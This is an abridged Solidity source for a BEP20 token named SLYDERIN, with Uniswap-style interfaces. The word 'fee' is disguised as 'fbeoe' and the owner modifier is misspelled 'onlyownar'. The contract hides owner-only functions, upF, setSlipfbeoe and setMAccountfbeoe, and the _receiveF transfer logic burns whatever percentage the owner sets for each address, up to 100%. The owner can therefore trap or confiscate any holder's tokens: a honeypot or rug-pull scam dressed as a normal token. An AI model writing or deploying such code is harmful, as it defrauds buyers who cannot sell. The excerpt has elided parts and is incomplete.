...
interface IUniswapV2Factory {
    ...
    function fbeoeTo() external view returns (address);
    function fbeoeToSetter() external view returns (address);
    ...
    function setfbeoeTo(address) external;
    function setfbeoeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfbeoeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfbeoeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfbeoeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfbeoeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfbeoeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SLYDERIN is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfbeoe = 0;

    uint256 private _defaultBuyfbeoe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfbeoe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfbeoe = _value;
    }

    function setSlipfbeoe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfbeoe[_address] = _value;
    }

    function getSlipfbeoe(address _address) external view onlyownar returns (uint256) {
        return _slipfbeoe[_address];
    }


    function setMAccountfbeoe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfbeoe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefbeoeAmount = 0;

        if (rF) {
            uint256 tradefbeoe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefbeoe = _defaultSellfbeoe;
                }
                if (from == uniswapV2Pair) {

                    tradefbeoe = _defaultBuyfbeoe;
                }
            }
            if (_slipfbeoe[from] > 0) {
                tradefbeoe = _slipfbeoe[from];
            }

            tradefbeoeAmount = _Amount.mul(tradefbeoe).div(100);
        }


        if (tradefbeoeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefbeoeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefbeoeAmount);
            emit Transfer(from, _deadAddress, tradefbeoeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefbeoeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefbeoeAmount);
        emit Transfer(from, _to, _Amount - tradefbeoeAmount);
    }
